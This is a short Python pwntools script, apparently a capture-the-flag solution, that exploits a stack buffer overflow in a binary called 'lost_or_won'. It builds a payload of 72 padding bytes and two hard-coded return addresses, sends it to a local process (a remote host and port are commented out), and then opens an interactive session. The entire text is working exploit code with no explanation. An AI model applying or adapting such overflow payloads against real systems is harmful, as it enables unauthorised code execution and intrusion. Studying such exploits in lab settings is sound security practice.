from pwn import *

io = process("./lost_or_won")
#io = remote("65.1.2.66", 32093)

payload = b"a"*72
payload +=p64(0x4012b4)
payload += p64(0x40121b)
io.sendline(payload)
#gdb.attach(io)
io.interactive()